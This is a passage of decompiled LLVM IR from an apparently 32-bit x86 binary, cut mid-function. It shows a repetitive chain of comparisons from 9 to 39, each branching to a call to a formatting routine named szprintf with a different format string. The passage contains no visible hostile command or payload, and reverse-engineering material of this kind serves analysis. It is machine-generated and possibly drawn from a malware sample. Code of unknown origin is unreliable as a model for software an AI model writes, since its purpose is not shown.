  %v2_804a0ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0ea, i32* @ebx, align 4
  %v4_804a0fc = call i32 @szprintf(i32 %v2_804a0ea, i32 ptrtoint ([13 x i8]* @global_var_80589a6.50 to i32), i32 %v1_804a0db)
  br label %dec_label_pc_804a101

dec_label_pc_804a101:                             ; preds = %dec_label_pc_804a0cb, %dec_label_pc_804a0d1
  %v13_804a101 = icmp eq i32 %v2_8049efa, 9
  %v1_804a105 = icmp eq i1 %v13_804a101, false
  br i1 %v1_804a105, label %dec_label_pc_804a137, label %dec_label_pc_804a107

dec_label_pc_804a107:                             ; preds = %dec_label_pc_804a101
  %v0_804a107 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a107 = zext i8 %v0_804a107 to i32
  store i32 %v1_804a107, i32* @edx, align 4
  %v0_804a111 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a111 = zext i8 %v0_804a111 to i32
  %v2_804a120 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a120, i32* @ebx, align 4
  %v4_804a132 = call i32 @szprintf(i32 %v2_804a120, i32 ptrtoint ([13 x i8]* @global_var_80589b3.51 to i32), i32 %v1_804a111)
  br label %dec_label_pc_804a137

dec_label_pc_804a137:                             ; preds = %dec_label_pc_804a101, %dec_label_pc_804a107
  %v13_804a137 = icmp eq i32 %v2_8049efa, 10
  %v1_804a13b = icmp eq i1 %v13_804a137, false
  br i1 %v1_804a13b, label %dec_label_pc_804a16d, label %dec_label_pc_804a13d

dec_label_pc_804a13d:                             ; preds = %dec_label_pc_804a137
  %v0_804a13d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a13d = zext i8 %v0_804a13d to i32
  store i32 %v1_804a13d, i32* @edx, align 4
  %v0_804a147 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a147 = zext i8 %v0_804a147 to i32
  %v2_804a156 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a156, i32* @ebx, align 4
  %v4_804a168 = call i32 @szprintf(i32 %v2_804a156, i32 ptrtoint ([14 x i8]* @global_var_80589c0.52 to i32), i32 %v1_804a147)
  br label %dec_label_pc_804a16d

dec_label_pc_804a16d:                             ; preds = %dec_label_pc_804a137, %dec_label_pc_804a13d
  %v13_804a16d = icmp eq i32 %v2_8049efa, 11
  %v1_804a171 = icmp eq i1 %v13_804a16d, false
  br i1 %v1_804a171, label %dec_label_pc_804a1a3, label %dec_label_pc_804a173

dec_label_pc_804a173:                             ; preds = %dec_label_pc_804a16d
  %v0_804a173 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a173 = zext i8 %v0_804a173 to i32
  store i32 %v1_804a173, i32* @edx, align 4
  %v0_804a17d = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a17d = zext i8 %v0_804a17d to i32
  %v2_804a18c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a18c, i32* @ebx, align 4
  %v4_804a19e = call i32 @szprintf(i32 %v2_804a18c, i32 ptrtoint ([11 x i8]* @global_var_80589ce.53 to i32), i32 %v1_804a17d)
  br label %dec_label_pc_804a1a3

dec_label_pc_804a1a3:                             ; preds = %dec_label_pc_804a16d, %dec_label_pc_804a173
  %v13_804a1a3 = icmp eq i32 %v2_8049efa, 12
  %v1_804a1a7 = icmp eq i1 %v13_804a1a3, false
  br i1 %v1_804a1a7, label %dec_label_pc_804a1d9, label %dec_label_pc_804a1a9

dec_label_pc_804a1a9:                             ; preds = %dec_label_pc_804a1a3
  %v0_804a1a9 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a1a9 = zext i8 %v0_804a1a9 to i32
  store i32 %v1_804a1a9, i32* @edx, align 4
  %v0_804a1b3 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a1b3 = zext i8 %v0_804a1b3 to i32
  %v2_804a1c2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1c2, i32* @ebx, align 4
  %v4_804a1d4 = call i32 @szprintf(i32 %v2_804a1c2, i32 ptrtoint ([13 x i8]* @global_var_80589d9.54 to i32), i32 %v1_804a1b3)
  br label %dec_label_pc_804a1d9

dec_label_pc_804a1d9:                             ; preds = %dec_label_pc_804a1a3, %dec_label_pc_804a1a9
  %v13_804a1d9 = icmp eq i32 %v2_8049efa, 13
  %v1_804a1dd = icmp eq i1 %v13_804a1d9, false
  br i1 %v1_804a1dd, label %dec_label_pc_804a20f, label %dec_label_pc_804a1df

dec_label_pc_804a1df:                             ; preds = %dec_label_pc_804a1d9
  %v0_804a1df = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a1df = zext i8 %v0_804a1df to i32
  store i32 %v1_804a1df, i32* @edx, align 4
  %v0_804a1e9 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a1e9 = zext i8 %v0_804a1e9 to i32
  %v2_804a1f8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1f8, i32* @ebx, align 4
  %v4_804a20a = call i32 @szprintf(i32 %v2_804a1f8, i32 ptrtoint ([13 x i8]* @global_var_80589e6.55 to i32), i32 %v1_804a1e9)
  br label %dec_label_pc_804a20f

dec_label_pc_804a20f:                             ; preds = %dec_label_pc_804a1d9, %dec_label_pc_804a1df
  %v13_804a20f = icmp eq i32 %v2_8049efa, 14
  %v1_804a213 = icmp eq i1 %v13_804a20f, false
  br i1 %v1_804a213, label %dec_label_pc_804a245, label %dec_label_pc_804a215

dec_label_pc_804a215:                             ; preds = %dec_label_pc_804a20f
  %v0_804a215 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a215 = zext i8 %v0_804a215 to i32
  store i32 %v1_804a215, i32* @edx, align 4
  %v0_804a21f = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a21f = zext i8 %v0_804a21f to i32
  %v2_804a22e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a22e, i32* @ebx, align 4
  %v4_804a240 = call i32 @szprintf(i32 %v2_804a22e, i32 ptrtoint ([13 x i8]* @global_var_80589f3.56 to i32), i32 %v1_804a21f)
  br label %dec_label_pc_804a245

dec_label_pc_804a245:                             ; preds = %dec_label_pc_804a20f, %dec_label_pc_804a215
  %v13_804a245 = icmp eq i32 %v2_8049efa, 15
  %v1_804a249 = icmp eq i1 %v13_804a245, false
  br i1 %v1_804a249, label %dec_label_pc_804a27b, label %dec_label_pc_804a24b

dec_label_pc_804a24b:                             ; preds = %dec_label_pc_804a245
  %v0_804a24b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a24b = zext i8 %v0_804a24b to i32
  store i32 %v1_804a24b, i32* @edx, align 4
  %v0_804a255 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a255 = zext i8 %v0_804a255 to i32
  %v2_804a264 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a264, i32* @ebx, align 4
  %v4_804a276 = call i32 @szprintf(i32 %v2_804a264, i32 ptrtoint ([13 x i8]* @global_var_8058a00.57 to i32), i32 %v1_804a255)
  br label %dec_label_pc_804a27b

dec_label_pc_804a27b:                             ; preds = %dec_label_pc_804a245, %dec_label_pc_804a24b
  %v10_804a27b = icmp eq i32 %v2_8049efa, 16
  %v1_804a27f = icmp eq i1 %v10_804a27b, false
  br i1 %v1_804a27f, label %dec_label_pc_804a2b1, label %dec_label_pc_804a281

dec_label_pc_804a281:                             ; preds = %dec_label_pc_804a27b
  %v0_804a281 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a281 = zext i8 %v0_804a281 to i32
  store i32 %v1_804a281, i32* @edx, align 4
  %v0_804a28b = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a28b = zext i8 %v0_804a28b to i32
  %v2_804a29a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a29a, i32* @ebx, align 4
  %v4_804a2ac = call i32 @szprintf(i32 %v2_804a29a, i32 ptrtoint ([13 x i8]* @global_var_8058a0d.58 to i32), i32 %v1_804a28b)
  br label %dec_label_pc_804a2b1

dec_label_pc_804a2b1:                             ; preds = %dec_label_pc_804a27b, %dec_label_pc_804a281
  %v13_804a2b1 = icmp eq i32 %v2_8049efa, 17
  %v1_804a2b5 = icmp eq i1 %v13_804a2b1, false
  br i1 %v1_804a2b5, label %dec_label_pc_804a2e7, label %dec_label_pc_804a2b7

dec_label_pc_804a2b7:                             ; preds = %dec_label_pc_804a2b1
  %v0_804a2b7 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a2b7 = zext i8 %v0_804a2b7 to i32
  store i32 %v1_804a2b7, i32* @edx, align 4
  %v0_804a2c1 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a2c1 = zext i8 %v0_804a2c1 to i32
  %v2_804a2d0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2d0, i32* @ebx, align 4
  %v4_804a2e2 = call i32 @szprintf(i32 %v2_804a2d0, i32 ptrtoint ([13 x i8]* @global_var_8058a1a.59 to i32), i32 %v1_804a2c1)
  br label %dec_label_pc_804a2e7

dec_label_pc_804a2e7:                             ; preds = %dec_label_pc_804a2b1, %dec_label_pc_804a2b7
  %v13_804a2e7 = icmp eq i32 %v2_8049efa, 18
  %v1_804a2eb = icmp eq i1 %v13_804a2e7, false
  br i1 %v1_804a2eb, label %dec_label_pc_804a31d, label %dec_label_pc_804a2ed

dec_label_pc_804a2ed:                             ; preds = %dec_label_pc_804a2e7
  %v0_804a2ed = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a2ed = zext i8 %v0_804a2ed to i32
  store i32 %v1_804a2ed, i32* @edx, align 4
  %v0_804a2f7 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a2f7 = zext i8 %v0_804a2f7 to i32
  %v2_804a306 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a306, i32* @ebx, align 4
  %v4_804a318 = call i32 @szprintf(i32 %v2_804a306, i32 ptrtoint ([13 x i8]* @global_var_8058a27.60 to i32), i32 %v1_804a2f7)
  br label %dec_label_pc_804a31d

dec_label_pc_804a31d:                             ; preds = %dec_label_pc_804a2e7, %dec_label_pc_804a2ed
  %v13_804a31d = icmp eq i32 %v2_8049efa, 19
  %v1_804a321 = icmp eq i1 %v13_804a31d, false
  br i1 %v1_804a321, label %dec_label_pc_804a353, label %dec_label_pc_804a323

dec_label_pc_804a323:                             ; preds = %dec_label_pc_804a31d
  %v0_804a323 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a323 = zext i8 %v0_804a323 to i32
  store i32 %v1_804a323, i32* @edx, align 4
  %v0_804a32d = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a32d = zext i8 %v0_804a32d to i32
  %v2_804a33c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a33c, i32* @ebx, align 4
  %v4_804a34e = call i32 @szprintf(i32 %v2_804a33c, i32 ptrtoint ([11 x i8]* @global_var_8058a34.61 to i32), i32 %v1_804a32d)
  br label %dec_label_pc_804a353

dec_label_pc_804a353:                             ; preds = %dec_label_pc_804a31d, %dec_label_pc_804a323
  %v13_804a353 = icmp eq i32 %v2_8049efa, 20
  %v1_804a357 = icmp eq i1 %v13_804a353, false
  br i1 %v1_804a357, label %dec_label_pc_804a389, label %dec_label_pc_804a359

dec_label_pc_804a359:                             ; preds = %dec_label_pc_804a353
  %v0_804a359 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a359 = zext i8 %v0_804a359 to i32
  store i32 %v1_804a359, i32* @edx, align 4
  %v0_804a363 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a363 = zext i8 %v0_804a363 to i32
  %v2_804a372 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a372, i32* @ebx, align 4
  %v4_804a384 = call i32 @szprintf(i32 %v2_804a372, i32 ptrtoint ([12 x i8]* @global_var_8058a3f.62 to i32), i32 %v1_804a363)
  br label %dec_label_pc_804a389

dec_label_pc_804a389:                             ; preds = %dec_label_pc_804a353, %dec_label_pc_804a359
  %v13_804a389 = icmp eq i32 %v2_8049efa, 21
  %v1_804a38d = icmp eq i1 %v13_804a389, false
  br i1 %v1_804a38d, label %dec_label_pc_804a3bf, label %dec_label_pc_804a38f

dec_label_pc_804a38f:                             ; preds = %dec_label_pc_804a389
  %v0_804a38f = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a38f = zext i8 %v0_804a38f to i32
  store i32 %v1_804a38f, i32* @edx, align 4
  %v0_804a399 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a399 = zext i8 %v0_804a399 to i32
  %v2_804a3a8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3a8, i32* @ebx, align 4
  %v4_804a3ba = call i32 @szprintf(i32 %v2_804a3a8, i32 ptrtoint ([13 x i8]* @global_var_8058a4b.63 to i32), i32 %v1_804a399)
  br label %dec_label_pc_804a3bf

dec_label_pc_804a3bf:                             ; preds = %dec_label_pc_804a389, %dec_label_pc_804a38f
  %v13_804a3bf = icmp eq i32 %v2_8049efa, 22
  %v1_804a3c3 = icmp eq i1 %v13_804a3bf, false
  br i1 %v1_804a3c3, label %dec_label_pc_804a3f5, label %dec_label_pc_804a3c5

dec_label_pc_804a3c5:                             ; preds = %dec_label_pc_804a3bf
  %v0_804a3c5 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a3c5 = zext i8 %v0_804a3c5 to i32
  store i32 %v1_804a3c5, i32* @edx, align 4
  %v0_804a3cf = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a3cf = zext i8 %v0_804a3cf to i32
  %v2_804a3de = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3de, i32* @ebx, align 4
  %v4_804a3f0 = call i32 @szprintf(i32 %v2_804a3de, i32 ptrtoint ([11 x i8]* @global_var_8058a58.64 to i32), i32 %v1_804a3cf)
  br label %dec_label_pc_804a3f5

dec_label_pc_804a3f5:                             ; preds = %dec_label_pc_804a3bf, %dec_label_pc_804a3c5
  %v13_804a3f5 = icmp eq i32 %v2_8049efa, 23
  %v1_804a3f9 = icmp eq i1 %v13_804a3f5, false
  br i1 %v1_804a3f9, label %dec_label_pc_804a42b, label %dec_label_pc_804a3fb

dec_label_pc_804a3fb:                             ; preds = %dec_label_pc_804a3f5
  %v0_804a3fb = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a3fb = zext i8 %v0_804a3fb to i32
  store i32 %v1_804a3fb, i32* @edx, align 4
  %v0_804a405 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a405 = zext i8 %v0_804a405 to i32
  %v2_804a414 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a414, i32* @ebx, align 4
  %v4_804a426 = call i32 @szprintf(i32 %v2_804a414, i32 ptrtoint ([11 x i8]* @global_var_8058a63.65 to i32), i32 %v1_804a405)
  br label %dec_label_pc_804a42b

dec_label_pc_804a42b:                             ; preds = %dec_label_pc_804a3f5, %dec_label_pc_804a3fb
  %v13_804a42b = icmp eq i32 %v2_8049efa, 24
  %v1_804a42f = icmp eq i1 %v13_804a42b, false
  br i1 %v1_804a42f, label %dec_label_pc_804a461, label %dec_label_pc_804a431

dec_label_pc_804a431:                             ; preds = %dec_label_pc_804a42b
  %v0_804a431 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a431 = zext i8 %v0_804a431 to i32
  store i32 %v1_804a431, i32* @edx, align 4
  %v0_804a43b = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a43b = zext i8 %v0_804a43b to i32
  %v2_804a44a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a44a, i32* @ebx, align 4
  %v4_804a45c = call i32 @szprintf(i32 %v2_804a44a, i32 ptrtoint ([12 x i8]* @global_var_8058a6e.66 to i32), i32 %v1_804a43b)
  br label %dec_label_pc_804a461

dec_label_pc_804a461:                             ; preds = %dec_label_pc_804a42b, %dec_label_pc_804a431
  %v13_804a461 = icmp eq i32 %v2_8049efa, 25
  %v1_804a465 = icmp eq i1 %v13_804a461, false
  br i1 %v1_804a465, label %dec_label_pc_804a497, label %dec_label_pc_804a467

dec_label_pc_804a467:                             ; preds = %dec_label_pc_804a461
  %v0_804a467 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a467 = zext i8 %v0_804a467 to i32
  store i32 %v1_804a467, i32* @edx, align 4
  %v0_804a471 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a471 = zext i8 %v0_804a471 to i32
  %v2_804a480 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a480, i32* @ebx, align 4
  %v4_804a492 = call i32 @szprintf(i32 %v2_804a480, i32 ptrtoint ([12 x i8]* @global_var_8058a7a.67 to i32), i32 %v1_804a471)
  br label %dec_label_pc_804a497

dec_label_pc_804a497:                             ; preds = %dec_label_pc_804a461, %dec_label_pc_804a467
  %v13_804a497 = icmp eq i32 %v2_8049efa, 26
  %v1_804a49b = icmp eq i1 %v13_804a497, false
  br i1 %v1_804a49b, label %dec_label_pc_804a4cd, label %dec_label_pc_804a49d

dec_label_pc_804a49d:                             ; preds = %dec_label_pc_804a497
  %v0_804a49d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a49d = zext i8 %v0_804a49d to i32
  store i32 %v1_804a49d, i32* @edx, align 4
  %v0_804a4a7 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a4a7 = zext i8 %v0_804a4a7 to i32
  %v2_804a4b6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4b6, i32* @ebx, align 4
  %v4_804a4c8 = call i32 @szprintf(i32 %v2_804a4b6, i32 ptrtoint ([12 x i8]* @global_var_8058a86.68 to i32), i32 %v1_804a4a7)
  br label %dec_label_pc_804a4cd

dec_label_pc_804a4cd:                             ; preds = %dec_label_pc_804a497, %dec_label_pc_804a49d
  %v13_804a4cd = icmp eq i32 %v2_8049efa, 27
  %v1_804a4d1 = icmp eq i1 %v13_804a4cd, false
  br i1 %v1_804a4d1, label %dec_label_pc_804a503, label %dec_label_pc_804a4d3

dec_label_pc_804a4d3:                             ; preds = %dec_label_pc_804a4cd
  %v0_804a4d3 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a4d3 = zext i8 %v0_804a4d3 to i32
  store i32 %v1_804a4d3, i32* @edx, align 4
  %v0_804a4dd = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a4dd = zext i8 %v0_804a4dd to i32
  %v2_804a4ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4ec, i32* @ebx, align 4
  %v4_804a4fe = call i32 @szprintf(i32 %v2_804a4ec, i32 ptrtoint ([13 x i8]* @global_var_8058a92.69 to i32), i32 %v1_804a4dd)
  br label %dec_label_pc_804a503

dec_label_pc_804a503:                             ; preds = %dec_label_pc_804a4cd, %dec_label_pc_804a4d3
  %v13_804a503 = icmp eq i32 %v2_8049efa, 28
  %v1_804a507 = icmp eq i1 %v13_804a503, false
  br i1 %v1_804a507, label %dec_label_pc_804a539, label %dec_label_pc_804a509

dec_label_pc_804a509:                             ; preds = %dec_label_pc_804a503
  %v0_804a509 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a509 = zext i8 %v0_804a509 to i32
  store i32 %v1_804a509, i32* @edx, align 4
  %v0_804a513 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a513 = zext i8 %v0_804a513 to i32
  %v2_804a522 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a522, i32* @ebx, align 4
  %v4_804a534 = call i32 @szprintf(i32 %v2_804a522, i32 ptrtoint ([13 x i8]* @global_var_8058a9f.70 to i32), i32 %v1_804a513)
  br label %dec_label_pc_804a539

dec_label_pc_804a539:                             ; preds = %dec_label_pc_804a503, %dec_label_pc_804a509
  %v13_804a539 = icmp eq i32 %v2_8049efa, 29
  %v1_804a53d = icmp eq i1 %v13_804a539, false
  br i1 %v1_804a53d, label %dec_label_pc_804a56f, label %dec_label_pc_804a53f

dec_label_pc_804a53f:                             ; preds = %dec_label_pc_804a539
  %v0_804a53f = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a53f = zext i8 %v0_804a53f to i32
  store i32 %v1_804a53f, i32* @edx, align 4
  %v0_804a549 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a549 = zext i8 %v0_804a549 to i32
  %v2_804a558 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a558, i32* @ebx, align 4
  %v4_804a56a = call i32 @szprintf(i32 %v2_804a558, i32 ptrtoint ([12 x i8]* @global_var_8058aac.71 to i32), i32 %v1_804a549)
  br label %dec_label_pc_804a56f

dec_label_pc_804a56f:                             ; preds = %dec_label_pc_804a539, %dec_label_pc_804a53f
  %v13_804a56f = icmp eq i32 %v2_8049efa, 30
  %v1_804a573 = icmp eq i1 %v13_804a56f, false
  br i1 %v1_804a573, label %dec_label_pc_804a5a5, label %dec_label_pc_804a575

dec_label_pc_804a575:                             ; preds = %dec_label_pc_804a56f
  %v0_804a575 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a575 = zext i8 %v0_804a575 to i32
  store i32 %v1_804a575, i32* @edx, align 4
  %v0_804a57f = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a57f = zext i8 %v0_804a57f to i32
  %v2_804a58e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a58e, i32* @ebx, align 4
  %v4_804a5a0 = call i32 @szprintf(i32 %v2_804a58e, i32 ptrtoint ([13 x i8]* @global_var_8058ab8.72 to i32), i32 %v1_804a57f)
  br label %dec_label_pc_804a5a5

dec_label_pc_804a5a5:                             ; preds = %dec_label_pc_804a56f, %dec_label_pc_804a575
  %v13_804a5a5 = icmp eq i32 %v2_8049efa, 31
  %v1_804a5a9 = icmp eq i1 %v13_804a5a5, false
  br i1 %v1_804a5a9, label %dec_label_pc_804a5db, label %dec_label_pc_804a5ab

dec_label_pc_804a5ab:                             ; preds = %dec_label_pc_804a5a5
  %v0_804a5ab = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a5ab = zext i8 %v0_804a5ab to i32
  store i32 %v1_804a5ab, i32* @edx, align 4
  %v0_804a5b5 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a5b5 = zext i8 %v0_804a5b5 to i32
  %v2_804a5c4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5c4, i32* @ebx, align 4
  %v4_804a5d6 = call i32 @szprintf(i32 %v2_804a5c4, i32 ptrtoint ([12 x i8]* @global_var_8058ac5.73 to i32), i32 %v1_804a5b5)
  br label %dec_label_pc_804a5db

dec_label_pc_804a5db:                             ; preds = %dec_label_pc_804a5a5, %dec_label_pc_804a5ab
  %v10_804a5db = icmp eq i32 %v2_8049efa, 32
  %v1_804a5df = icmp eq i1 %v10_804a5db, false
  br i1 %v1_804a5df, label %dec_label_pc_804a611, label %dec_label_pc_804a5e1

dec_label_pc_804a5e1:                             ; preds = %dec_label_pc_804a5db
  %v0_804a5e1 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a5e1 = zext i8 %v0_804a5e1 to i32
  store i32 %v1_804a5e1, i32* @edx, align 4
  %v0_804a5eb = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a5eb = zext i8 %v0_804a5eb to i32
  %v2_804a5fa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5fa, i32* @ebx, align 4
  %v4_804a60c = call i32 @szprintf(i32 %v2_804a5fa, i32 ptrtoint ([11 x i8]* @global_var_8058ad1.74 to i32), i32 %v1_804a5eb)
  br label %dec_label_pc_804a611

dec_label_pc_804a611:                             ; preds = %dec_label_pc_804a5db, %dec_label_pc_804a5e1
  %v13_804a611 = icmp eq i32 %v2_8049efa, 33
  %v1_804a615 = icmp eq i1 %v13_804a611, false
  br i1 %v1_804a615, label %dec_label_pc_804a647, label %dec_label_pc_804a617

dec_label_pc_804a617:                             ; preds = %dec_label_pc_804a611
  %v0_804a617 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a617 = zext i8 %v0_804a617 to i32
  store i32 %v1_804a617, i32* @edx, align 4
  %v0_804a621 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a621 = zext i8 %v0_804a621 to i32
  %v2_804a630 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a630, i32* @ebx, align 4
  %v4_804a642 = call i32 @szprintf(i32 %v2_804a630, i32 ptrtoint ([12 x i8]* @global_var_8058adc.75 to i32), i32 %v1_804a621)
  br label %dec_label_pc_804a647

dec_label_pc_804a647:                             ; preds = %dec_label_pc_804a611, %dec_label_pc_804a617
  %v13_804a647 = icmp eq i32 %v2_8049efa, 34
  %v1_804a64b = icmp eq i1 %v13_804a647, false
  br i1 %v1_804a64b, label %dec_label_pc_804a67d, label %dec_label_pc_804a64d

dec_label_pc_804a64d:                             ; preds = %dec_label_pc_804a647
  %v0_804a64d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a64d = zext i8 %v0_804a64d to i32
  store i32 %v1_804a64d, i32* @edx, align 4
  %v0_804a657 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a657 = zext i8 %v0_804a657 to i32
  %v2_804a666 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a666, i32* @ebx, align 4
  %v4_804a678 = call i32 @szprintf(i32 %v2_804a666, i32 ptrtoint ([12 x i8]* @global_var_8058ae8.76 to i32), i32 %v1_804a657)
  br label %dec_label_pc_804a67d

dec_label_pc_804a67d:                             ; preds = %dec_label_pc_804a647, %dec_label_pc_804a64d
  %v13_804a67d = icmp eq i32 %v2_8049efa, 35
  %v1_804a681 = icmp eq i1 %v13_804a67d, false
  br i1 %v1_804a681, label %dec_label_pc_804a6b3, label %dec_label_pc_804a683

dec_label_pc_804a683:                             ; preds = %dec_label_pc_804a67d
  %v0_804a683 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a683 = zext i8 %v0_804a683 to i32
  store i32 %v1_804a683, i32* @edx, align 4
  %v0_804a68d = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a68d = zext i8 %v0_804a68d to i32
  %v2_804a69c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a69c, i32* @ebx, align 4
  %v4_804a6ae = call i32 @szprintf(i32 %v2_804a69c, i32 ptrtoint ([12 x i8]* @global_var_8058af4.77 to i32), i32 %v1_804a68d)
  br label %dec_label_pc_804a6b3

dec_label_pc_804a6b3:                             ; preds = %dec_label_pc_804a67d, %dec_label_pc_804a683
  %v13_804a6b3 = icmp eq i32 %v2_8049efa, 36
  %v1_804a6b7 = icmp eq i1 %v13_804a6b3, false
  br i1 %v1_804a6b7, label %dec_label_pc_804a6e9, label %dec_label_pc_804a6b9

dec_label_pc_804a6b9:                             ; preds = %dec_label_pc_804a6b3
  %v0_804a6b9 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a6b9 = zext i8 %v0_804a6b9 to i32
  store i32 %v1_804a6b9, i32* @edx, align 4
  %v0_804a6c3 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a6c3 = zext i8 %v0_804a6c3 to i32
  %v2_804a6d2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6d2, i32* @ebx, align 4
  %v4_804a6e4 = call i32 @szprintf(i32 %v2_804a6d2, i32 ptrtoint ([12 x i8]* @global_var_8058b00.78 to i32), i32 %v1_804a6c3)
  br label %dec_label_pc_804a6e9

dec_label_pc_804a6e9:                             ; preds = %dec_label_pc_804a6b3, %dec_label_pc_804a6b9
  %v13_804a6e9 = icmp eq i32 %v2_8049efa, 37
  %v1_804a6ed = icmp eq i1 %v13_804a6e9, false
  br i1 %v1_804a6ed, label %dec_label_pc_804a71f, label %dec_label_pc_804a6ef

dec_label_pc_804a6ef:                             ; preds = %dec_label_pc_804a6e9
  %v0_804a6ef = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a6ef = zext i8 %v0_804a6ef to i32
  store i32 %v1_804a6ef, i32* @edx, align 4
  %v0_804a6f9 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a6f9 = zext i8 %v0_804a6f9 to i32
  %v2_804a708 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a708, i32* @ebx, align 4
  %v4_804a71a = call i32 @szprintf(i32 %v2_804a708, i32 ptrtoint ([12 x i8]* @global_var_8058b0c.79 to i32), i32 %v1_804a6f9)
  br label %dec_label_pc_804a71f

dec_label_pc_804a71f:                             ; preds = %dec_label_pc_804a6e9, %dec_label_pc_804a6ef
  %v13_804a71f = icmp eq i32 %v2_8049efa, 38
  %v1_804a723 = icmp eq i1 %v13_804a71f, false
  br i1 %v1_804a723, label %dec_label_pc_804a755, label %dec_label_pc_804a725

dec_label_pc_804a725:                             ; preds = %dec_label_pc_804a71f
  %v0_804a725 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804a725 = zext i8 %v0_804a725 to i32
  store i32 %v1_804a725, i32* @edx, align 4
  %v0_804a72f = load i8, i8* @global_var_805c539.40, align 1
  %v1_804a72f = zext i8 %v0_804a72f to i32
  %v2_804a73e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a73e, i32* @ebx, align 4
  %v4_804a750 = call i32 @szprintf(i32 %v2_804a73e, i32 ptrtoint ([13 x i8]* @global_var_8058b18.80 to i32), i32 %v1_804a72f)
  br label %dec_label_pc_804a755

dec_label_pc_804a755:                             ; preds = %dec_label_pc_804a71f, %dec_label_pc_804a725
  %v13_804a755 = icmp eq i32 %v2_8049efa, 39
  %v1_804a759 = icmp eq i1 %v13_804a755, false
  br i1 %v1_804a759, label %dec_label_pc_804a78b, label %dec_label_pc_804a75b

dec_label_pc_804a75b:                             ; preds = %dec_label_pc_804a755
